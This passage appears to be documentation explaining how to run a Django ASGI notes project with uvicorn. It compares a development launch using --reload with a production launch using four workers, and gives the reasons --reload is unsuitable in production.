exec python -m uvicorn notes_project.asgi:application \
    --host 0.0.0.0 \
    --port 8001 \
    --reload    # ← automatic restart when .py files change

Production:

exec python -m uvicorn notes_project.asgi:application \
    --host 0.0.0.0 \
    --port 8001 \
    --workers 4        # ← 4 parallel workers (2 × CPU cores)
    # Without --reload: a static launch, higher performance

In the real entrypoint.sh, --reload is added only when UVICORN_RELOAD=1 (the default), so for production it is enough to set UVICORN_RELOAD=0. The script has no --workers flag; you add it yourself.

--reload in production is an anti-pattern: - Uvicorn watches the file system → unnecessary load - Every write of a temp file or log → a possible restart - A single worker process (you cannot use --workers together with --reload)
